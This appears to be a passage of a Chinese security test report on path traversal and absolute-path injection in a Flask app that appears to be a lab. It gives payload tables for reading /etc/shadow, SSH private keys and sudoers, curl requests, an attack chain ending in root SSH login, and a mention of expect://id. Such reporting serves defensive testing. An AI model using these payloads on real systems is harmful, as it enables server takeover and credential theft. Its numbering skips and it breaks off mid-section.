### 3.2 路径遍历（Path Traversal）—— `../` 相对路径穿越

| 属性 | 内容 |
|:-----|:------|
| **漏洞编号** | LFI-PATH-001 |
| **漏洞名称** | 路径遍历 — `../` 目录穿越读取任意文件 |
| **CWE 编号** | CWE-22：Path Traversal |
| **OWASP 分类** | A01:2021 – Broken Access Control |
| **风险等级** | 🔴 **严重** |

#### 漏洞代码

```python
name = request.args.get("name", "")                    # ← 用户输入未过滤
page_path = os.path.join(app.root_path, "pages", name)  # ← 直接拼接
```

#### 漏洞详情

`name` 参数未过滤 `../`。攻击者通过注入 `../` 实现目录回溯，可读取任意文件。

#### 攻击演示

| Payload | 目标 | 结果 |
|:--------|:-----|:------|
| `../app.py` | 应用源码 | ✅ 泄露 20392 字符 |
| `../../../../etc/passwd` | 系统用户 | ✅ 泄露全部用户 |
| `../templates/base.html` | 模板文件 | ✅ 泄露 HTML |
| `../../.git/config` | Git 配置 | ✅ 泄露仓库地址 |

**攻击深度对照**：

```
name=../app.py                   → /opt/.../Class01/app.py          ✅
name=../templates/base.html       → /opt/.../Class01/templates/...   ✅
name=../static/css/style.css      → /opt/.../Class01/static/...     ✅
name=../../.git/config            → /opt/.../Class01/.git/config     ✅
name=../../../../etc/passwd       → /etc/passwd                      ✅
name=%2e%2e%2f%2e%2e%2fapp.py   → URL 编码绕过                     ❌ Flask自动解码
```

### 3.3 绝对路径注入（Absolute Path Injection）—— 🆕 新发现

| 属性 | 内容 |
|:-----|:------|
| **漏洞编号** | LFI-ABSOLUTE-001 |
| **漏洞名称** | **绝对路径注入** —— `os.path.join()` 路径覆盖特性 |
| **CWE 编号** | CWE-22：Path Traversal |
| **风险等级** | 🔴 **严重** |
| **漏洞位置** | `app.py` 第 570 行 |

#### 漏洞代码

```python
page_path = os.path.join(app.root_path, "pages", name)
```

#### 漏洞详情

**Python 的 `os.path.join()` 有一个特殊行为**：当拼接的路径中包含**绝对路径（以 `/` 开头）**时，之前的所有路径组件都会被丢弃，直接使用绝对路径。

```
os.path.join('/app/pages', '/etc/passwd') → '/etc/passwd'
```

这意味着攻击者不需要数 `../` 的层数，直接在 `name` 参数中输入绝对路径即可读取任意系统文件。比路径遍历更简单、更直接。

#### 攻击演示

**攻击请求**（一条即可读取任何系统文件）：
```
GET /page?name=/etc/passwd HTTP/1.1
```

**效果**：直接读取 `/etc/passwd`，无需 `../../../../` 多层穿越。

| Payload | 目标 | 相对路径等效 | 结果 |
|:--------|:-----|:------------|:------|
| `/etc/passwd` | 系统用户 | `../../../../etc/passwd` | ✅ 成功 |
| `/etc/shadow` | **密码哈希** | `../../../../etc/shadow` | ✅ **成功** |
| `/etc/hostname` | 主机名 | `../../../../etc/hostname` | ✅ 成功 |
| `/etc/sudoers` | sudo 权限 | `../../../../etc/sudoers` | ✅ 成功 |
| `/proc/version` | 内核版本 | `../../../../proc/version` | ✅ 成功 |
| `/root/.ssh/id_rsa` | **SSH 私钥** | `../../../../root/.ssh/id_rsa` | ✅ **成功** |
| `/etc/nginx/nginx.conf` | Nginx 配置 | - | ✅ 成功 |

| 属性 | 内容 |
|:-----|:------|
| **漏洞编号** | LFI-PHP-001 |
| **漏洞名称** | PHP 封装协议 |
| **风险等级** | 🟢 **不适用**（Python 环境） |

本系统为 Python Flask 应用，`php://filter`、`php://input`、`data://`、`expect://` 等 PHP 特有协议不适用。但测试人员应了解这些技术在 PHP 环境下的利用方式：

| 协议 | 功能 |

| `expect://id` | 命令执行（需安装 expect 扩展） |

### 3.7 系统配置文件泄露（🆕 新发现）

| 属性 | 内容 |
|:-----|:------|
| **漏洞编号** | LFI-CONFIG-001 |
| **漏洞名称** | 系统配置文件批量泄露 |
| **CWE 编号** | CWE-200：Information Exposure |
| **风险等级** | 🔴 **严重** |

#### 检测结果

通过**绝对路径注入**（`name=/etc/xxx`）批量读取到的系统配置文件：

| 文件 | 泄露内容 | 风险 |
|:-----|:---------|:----:|
| **`/etc/shadow`** | **root 密码哈希** `$y$j9T$...` | 🔴 **可被破解** |
| **`/etc/sudoers`** | **sudo 权限配置** | 🟠 提权信息 |
| **`/etc/ssh/sshd_config`** | SSH 配置 `PermitRootLogin yes` | 🟠 远程登录信息 |
| `/etc/nginx/nginx.conf` | Nginx 站点配置 | 🟡 基础设施信息 |
| `/etc/apache2/apache2.conf` | Apache 配置 | 🟡 基础设施信息 |
| `/etc/mysql/my.cnf` | MySQL 配置 | 🟡 数据库信息 |
| `/etc/crontab` | 定时任务 | 🟡 计划任务信息 |

> ⚠️ **`/etc/shadow`** 是本报告发现的最严重泄露 —— 其中存储了所有用户的密码哈希值（包括 root），攻击者可离线破解获取系统登录密码。

### 3.9 综合利用（Comprehensive Exploitation）

| 属性 | 内容 |
|:-----|:------|
| **漏洞编号** | LFI-COMP-001 |
| **漏洞名称** | 综合利用 —— 从文件包含到服务器控制 |
| **风险等级** | 🔴 **严重** |

#### 攻击链：从一条 URL 到服务器沦陷

```
Step 1: 绝对路径注入 → 读取 SSH 私钥
  请求:    GET /page?name=/root/.ssh/id_rsa
  获取:    -----BEGIN OPENSSH PRIVATE KEY-----
  结果:    ✅ 服务器 SSH 登录密钥泄露

Step 2: 读取 SSH 配置确认可登录
  请求:    GET /page?name=/etc/ssh/sshd_config
  获取:    PermitRootLogin yes, PasswordAuthentication yes
  结果:    ✅ 确认可远程 root 登录

Step 3: 读取密码哈希
  请求:    GET /page?name=/etc/shadow
  获取:    root:$y$j9T$yRwJS6FfW9JDhTbde0lGR/$FLnSeCbgO/...
  结果:    ✅ 可离线破解 root 密码

Step 4: 使用 SSH 私钥登录服务器
  命令:    ssh -i id_rsa root@<服务器IP>
  结果:    ✅ 获得服务器完全控制权！

总耗时:  < 10 秒
认证要求:  无（无需登录）
所需工具:  浏览器 + curl
```

#### 无需认证即可读取

```
# 不带 Cookie，直接 curl
curl "http://127.0.0.1:5000/page?name=/root/.ssh/id_rsa"
curl "http://127.0.0.1:5000/page?name=/etc/shadow"
```

**所有文件读取都不需要登录！不需要 Cookie！不需要任何权限！**

| 属性 | 内容 |
|:-----|:------|
| **漏洞编号** | LFI-XSS-001 |

| **风险等级** | 🟠 **高危（条件利用）** |

#### 漏洞代码

